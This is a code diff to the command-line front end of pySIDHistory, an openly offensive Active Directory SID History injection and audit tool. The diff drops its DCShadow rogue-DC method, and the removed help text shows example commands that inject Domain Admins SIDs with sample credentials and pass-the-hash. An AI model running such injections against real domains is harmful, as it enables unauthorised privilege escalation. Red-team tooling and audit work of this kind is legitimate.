@@ -1,12 +1,8 @@
 #!/usr/bin/env python3
 """
-pySIDHistory v2 - Remote SID History Attack & Audit Tool
+pySIDHistory v3 - Remote SID History Injection & Audit Tool
 
-v2 adds DSInternals-based injection for privileged SIDs (Domain Admins, etc.)
-that cannot be injected via DRSUAPI DRSAddSidHistory.
-v3 adds DCShadow replication-based injection (no NTDS downtime).
-
-Author: @felixbillieres
+Author: github.com/felixbillieres
 License: MIT
 """
 
@@ -26,9 +22,8 @@ BANNER = r"""
 | |_) | |_| |___) || | | |_| |  _  | \__ \ || (_) | |  | |_| |
 | .__/ \__, |____/|___||____/|_| |_|_|___/\__\___/|_|   \__, |
 |_|    |___/                                             |___/
-    Remote SID History Injection & Audit Tool  v2
-    DSInternals + DRSUAPI + DCShadow | github.com/felixbillieres
-                                      @felixbillieres
+    Remote SID History Injection & Audit Tool  v3
+    DSInternals + DRSUAPI | github.com/felixbillieres
 """
 
 
@@ -56,121 +51,74 @@ def setup_logging(verbose: bool = False, quiet: bool = False):
 def build_parser():
     """Build the argument parser."""
     parser = argparse.ArgumentParser(
-        description='pySIDHistory v2 - Remote SID History Attack & Audit Tool',
+        description='pySIDHistory v3 - Remote SID History Injection & Audit Tool',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-MODES:
-  Inject (DSInternals): Inject privileged SID via DSInternals (--target + --inject)
-  Inject (DRSUAPI):     Inject SID via DRSUAPI (--target + --method drsuapi + --source-user)
-  Inject (DCShadow):    Inject SID via AD replication (--target + --method dcshadow + --attacker-ip)
-  Query:                Query sIDHistory of an object (--query)
-  Lookup:               Lookup SID of an object (--lookup)
-  Audit:                Full domain sIDHistory audit (--audit)
-  Trusts:               Enumerate domain trusts (--enum-trusts)
-  Presets:              List well-known SID presets (--list-presets)
+injection methods:
+  dsinternals  Offline ntds.dit modification via SCMR (default, any SID, brief NTDS downtime)
+  drsuapi      DRSAddSidHistory RPC (cross-forest only, RID > 1000, no downtime)
 
-EXAMPLES:
-  # Inject Domain Admins of current domain via DSInternals
-  %(prog)s -d LAB1.LOCAL -u da-admin -p 'Pass123!' --dc-ip 10.0.0.1 \\
-      --target user1 --inject domain-admins
-
-  # Inject Domain Admins of a FOREIGN domain via DSInternals
-  %(prog)s -d LAB1.LOCAL -u da-admin -p 'Pass123!' --dc-ip 10.0.0.1 \\
-      --target user1 --inject domain-admins --inject-domain LAB2.LOCAL
-
-  # Inject arbitrary SID via DSInternals
-  %(prog)s -d LAB1.LOCAL -u da-admin -p 'Pass123!' --dc-ip 10.0.0.1 \\
-      --target user1 --inject S-1-5-21-3522073385-2671856591-2684624930-512
-
-  # DCShadow injection (no NTDS downtime, requires root for port 135)
-  sudo %(prog)s -d LAB1.LOCAL -u da-admin -p 'Pass123!' --dc-ip 10.0.0.1 \\
-      --target user1 --inject domain-admins --method dcshadow --attacker-ip 10.0.0.50
-
-  # Cross-forest SID injection via DRSUAPI (legacy v1 method)
-  %(prog)s -d DST.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 \\
-      --target victim --method drsuapi --source-user admin --source-domain SRC.LOCAL \\
-      --src-username admin --src-password Pass123 --src-domain SRC.LOCAL
-
-  # Full domain audit
-  %(prog)s -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 --audit
-
-  # Query a user's sIDHistory
-  %(prog)s -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 --query victim
+see README.md for usage examples and detailed documentation.
         """
     )
 
     # ── Connection ──
-    conn = parser.add_argument_group('Connection')
-    conn.add_argument('-d', '--domain', required=True, help='Target domain (e.g., CORP.LOCAL)')
-    conn.add_argument('-dc', '--dc-ip', required=True, help='Domain controller IP')
+    conn = parser.add_argument_group('connection')
+    conn.add_argument('-d', '--domain', required=True, help='target domain (CORP.LOCAL)')
+    conn.add_argument('-dc', '--dc-ip', required=True, help='domain controller IP')
     conn.add_argument('--dc-hostname', help='DC hostname (for Kerberos/SSL)')
-    conn.add_argument('--use-ssl', action='store_true', help='Use LDAPS (port 636)')
+    conn.add_argument('--use-ssl', action='store_true', help='use LDAPS (port 636)')
 
     # ── Authentication ──
-    auth = parser.add_argument_group('Authentication')
-    auth.add_argument('-u', '--username', help='Username')
-    auth.add_argument('-p', '--password', help='Password')
-
-    auth_methods = parser.add_mutually_exclusive_group()
-    auth_methods.add_argument('--ntlm', action='store_true', help='NTLM auth (default)')
-    auth_methods.add_argument('--ntlm-hash', metavar='HASH', help='Pass-the-Hash (LM:NT or NT)')
-    auth_methods.add_argument('--kerberos', action='store_true', help='Kerberos auth')
-    auth_methods.add_argument('--certificate', action='store_true', help='Client certificate auth')
-    auth_methods.add_argument('--simple', action='store_true', help='SIMPLE bind')
-
-    auth.add_argument('--ccache', help='Kerberos ccache file path')
-    auth.add_argument('--cert-file', help='Client certificate (.pem)')
-    auth.add_argument('--key-file', help='Client private key (.pem)')
+    auth = parser.add_argument_group('authentication')
+    auth.add_argument('-u', '--username', help='username')
+    auth.add_argument('-p', '--password', help='password')
+    auth_methods = auth.add_mutually_exclusive_group()
+    auth_methods.add_argument('--ntlm-hash', metavar='HASH', help='pass-the-hash (NT or LM:NT)')
+    auth_methods.add_argument('--kerberos', action='store_true', help='Kerberos auth (use with --ccache)')
+    auth_methods.add_argument('--certificate', action='store_true', help='certificate auth (use with --cert-file/--key-file)')
+    auth_methods.add_argument('--simple', action='store_true', help='SIMPLE bind (use with --use-ssl)')
+    auth.add_argument('--ccache', help='ccache file for Kerberos')
+    auth.add_argument('--cert-file', help='client certificate (.pem)')
+    auth.add_argument('--key-file', help='client private key (.pem)')
 
     # ── Actions ──
-    actions = parser.add_argument_group('Actions (pick one)')
+    actions = parser.add_argument_group('actions (pick one)')
     action_grp = actions.add_mutually_exclusive_group(required=True)
-    action_grp.add_argument('--target', '--target-user', dest='target', help='Target object to modify')
-    action_grp.add_argument('--query', '--query-user', dest='query', help='Query sIDHistory')
-    action_grp.add_argument('--lookup', '--lookup-user', dest='lookup', help='Lookup SID')
-    action_grp.add_argument('--audit', action='store_true', help='Full domain sIDHistory audit')
-    action_grp.add_argument('--enum-trusts', action='store_true', help='Enumerate domain trusts')
-    action_grp.add_argument('--list-presets', action='store_true', help='List available SID presets')
+    action_grp.add_argument('--target', '--target-user', dest='target', help='target object for injection')
+    action_grp.add_argument('--query', '--query-user', dest='query', help='query sIDHistory of an object')
+    action_grp.add_argument('--lookup', '--lookup-user', dest='lookup', help='resolve object to SID')
+    action_grp.add_argument('--audit', action='store_true', help='domain-wide sIDHistory audit')
+    action_grp.add_argument('--enum-trusts', action='store_true', help='enumerate domain trusts')
+    action_grp.add_argument('--list-presets', action='store_true', help='list well-known SID presets')
 
-    # ── Injection options (v2: DSInternals) ──
-    inject_opts = parser.add_argument_group('Injection options (with --target)')
-    inject_opts.add_argument('--inject', help='SID or preset to inject (e.g., domain-admins, S-1-5-21-...-512)')
-    inject_opts.add_argument('--inject-domain', help='Foreign domain for preset resolution (e.g., LAB2.LOCAL)')
-    inject_opts.add_argument('--method', choices=['dsinternals', 'drsuapi', 'dcshadow'], default='dsinternals',
-                             help='Injection method (default: dsinternals)')
-    inject_opts.add_argument('--dsinternals-path', help='Path to DSInternals module on the DC (if no internet)')
-    inject_opts.add_argument('--force', action='store_true', help='Skip confirmation warning before injection')
+    # ── Injection ──
+    inject_opts = parser.add_argument_group('injection (with --target)')
+    inject_opts.add_argument('--inject', help='SID or preset to inject (domain-admins, S-1-5-21-...-512)')
+    inject_opts.add_argument('--inject-domain', help='resolve preset against this domain')
+    inject_opts.add_argument('--method', choices=['dsinternals', 'drsuapi'], default='dsinternals',
+                             help='injection method (default: dsinternals)')
+    inject_opts.add_argument('--force', action='store_true', help='skip confirmation prompt')
+    inject_opts.add_argument('--dsinternals-path', help='DSInternals module path on the DC (offline install)')
 
-    # ── DCShadow options (with --method dcshadow) ──
-    dcshadow = parser.add_argument_group('DCShadow options (with --method dcshadow)')
-    dcshadow.add_argument('--attacker-ip', help='Attacker IP reachable from the DC (ports 135 + 1337)')
-    dcshadow.add_argument('--computer-name', help='Rogue DC machine account name (auto-generated if omitted)')
-    dcshadow.add_argument('--computer-password', help='Rogue DC machine account password (auto-generated if omitted)')
-
-    # ── DRSUAPI legacy options (with --method drsuapi) ──
-    mods = parser.add_argument_group('DRSUAPI options (with --method drsuapi)')
-    mods.add_argument('--source-user', help='Source user whose SID to inject (via DRSUAPI)')
-    mods.add_argument('--source-domain', help='Source domain (cross-forest injection)')
-
-    # ── Source domain credentials (DRSUAPI cross-forest) ──
-    src_creds = parser.add_argument_group('Source domain credentials (for DRSUAPI cross-forest)')
-    src_creds.add_argument('--src-username', help='Username for source domain authentication')
-    src_creds.add_argument('--src-password', help='Password for source domain authentication')
-    src_creds.add_argument('--src-domain', help='Domain for source domain authentication (defaults to --source-domain)')
+    # ── DRSUAPI ──
+    drsuapi = parser.add_argument_group('drsuapi (with --method drsuapi)')
+    drsuapi.add_argument('--source-user', help='source user whose SID to inject')
+    drsuapi.add_argument('--source-domain', help='source domain (cross-forest)')
+    drsuapi.add_argument('--src-username', help='source domain auth username')
+    drsuapi.add_argument('--src-password', help='source domain auth password')
+    drsuapi.add_argument('--src-domain', help='source domain auth domain')
 
     # ── Output ──
-    output = parser.add_argument_group('Output')
+    output = parser.add_argument_group('output')
     output.add_argument('-o', '--output-format', choices=['console', 'json', 'csv'],
-                       default='console', help='Output format (default: console)')
-    output.add_argument('--no-color', action='store_true', help='Disable colored output')
-    output.add_argument('--output-file', help='Write output to file')
-
-    # ── Other ──
-    other = parser.add_argument_group('Other')
-    other.add_argument('-v', '--verbose', action='store_true', help='Full debug output (LDAP, SMB, RPC, SCMR traces)')
-    other.add_argument('-q', '--quiet', action='store_true', help='Suppress all output except critical errors')
-    other.add_argument('--dry-run', action='store_true', help='Show what would be done without modifying')
-    other.add_argument('--no-banner', action='store_true', help='Suppress banner')
+                       default='console', help='output format (default: console)')
+    output.add_argument('--output-file', help='write output to file')
+    output.add_argument('--no-color', action='store_true', help='disable colored output')
+    output.add_argument('-v', '--verbose', action='store_true', help='debug traces (LDAP, SMB, RPC)')
+    output.add_argument('-q', '--quiet', action='store_true', help='suppress non-critical output')
+    output.add_argument('--dry-run', action='store_true', help='show what would be done')
+    output.add_argument('--no-banner', action='store_true', help='suppress banner')
 
     return parser
 
@@ -219,12 +167,6 @@ def validate_arguments(args, auth_method: str, parser) -> bool:
                 parser.error("--target with --method drsuapi requires --source-user and --source-domain")
             if args.source_user and not args.source_domain:
                 parser.error("--source-user requires --source-domain (DRSAddSidHistory is cross-forest only)")
-
-        elif method == 'dcshadow':
-            if not args.inject:
-                parser.error("--target with --method dcshadow requires --inject")
-            if not args.attacker_ip:
-                parser.error("--target with --method dcshadow requires --attacker-ip")
 
     return True
 
@@ -355,49 +297,6 @@ def handle_target(attacker: SIDHistoryAttack, formatter: OutputFormatter,
             src_creds_user=src_creds_user,
             src_creds_domain=src_creds_domain,
             src_creds_password=src_creds_password,
-        )
-
-    elif method == 'dcshadow':
-        # DCShadow replication path
-        if dry_run:
-            sid = attacker.resolve_inject_sid(args.inject, args.inject_domain)
-            print(f"[DRY-RUN] Would inject SID {sid or args.inject} into {target}")
-            print(f"[DRY-RUN] Method: DCShadow (AD replication via rogue DC)")
-            print(f"[DRY-RUN] Attacker IP: {args.attacker_ip}")
-            return True
-
-        # Interactive warning before injection
-        if not args.force:
-            print("\n" + "=" * 60)
-            print("  WARNING: DCShadow SID History Injection")
-            print("=" * 60)
-            print(f"  Target:      {target}")
-            print(f"  Inject:      {args.inject}")
-            if args.inject_domain:
-                print(f"  Domain:      {args.inject_domain}")
-            print(f"  DC:          {args.dc_ip}")
-            print(f"  Attacker IP: {args.attacker_ip}")
-            print()
-            print("  This will register a rogue DC in AD,")
-            print("  push crafted replication data, then cleanup.")
-            print("  Requires root (port 135) and DA privileges.")
-            print("=" * 60)
-            try:
-                answer = input("\n  Proceed? [y/N] ").strip().lower()
-                if answer not in ('y', 'yes'):
-                    print("Aborted.")
-                    return False
-            except (EOFError, KeyboardInterrupt):
-                print("\nAborted.")
-                return False
-
-        success = attacker.inject_sid_history(
-            target, method='dcshadow',
-            inject_value=args.inject,
-            inject_domain=args.inject_domain,
-            attacker_ip=args.attacker_ip,
-            computer_name=getattr(args, 'computer_name', None),
-            computer_password=getattr(args, 'computer_password', None),
         )
 
     else:
